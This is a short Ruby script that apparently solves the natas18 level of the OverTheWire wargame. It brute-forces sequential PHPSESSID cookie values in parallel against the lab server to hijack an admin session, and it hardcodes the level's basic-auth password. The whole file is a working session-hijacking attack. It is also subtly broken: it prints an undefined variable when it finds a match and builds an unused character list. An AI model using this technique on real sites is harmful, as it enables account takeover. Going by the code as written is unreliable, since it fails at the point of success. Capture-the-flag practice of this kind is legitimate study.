#!/usr/bin/ruby

require 'net/http'
require 'uri'
require 'colorize'
require 'byebug'
require "benchmark"
require 'celluloid/current'

class FindPHPWorker
    include Celluloid
    def find_password(sess_cookie)
        chars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
        uri = URI.parse("http://natas18.natas.labs.overthewire.org/")
        request = Net::HTTP::Post.new(uri)
        request.basic_auth("natas18", "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq")
        request.set_form_data(
            "username" => "test",
            "password" => "test"
        )
            puts "Test #{sess_cookie}".colorize(:yellow)
            cookie_string = ["PHPSESSID=#{sess_cookie}; path=/; HttpOnly"].join('; ')
            request['Cookie'] = cookie_string
            res = Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == "https",:read_timeout =>3) do |http|
                http.request(request)
            end
            unless res.body.include?('regular user')
                puts "Admin PHPSESSID: #{i}".colorize(:green)
            end
    end
end

find_php_pool = FindPHPWorker.pool(size: 10)

for i in 1..200
    find_php_pool.async.find_password(i)
end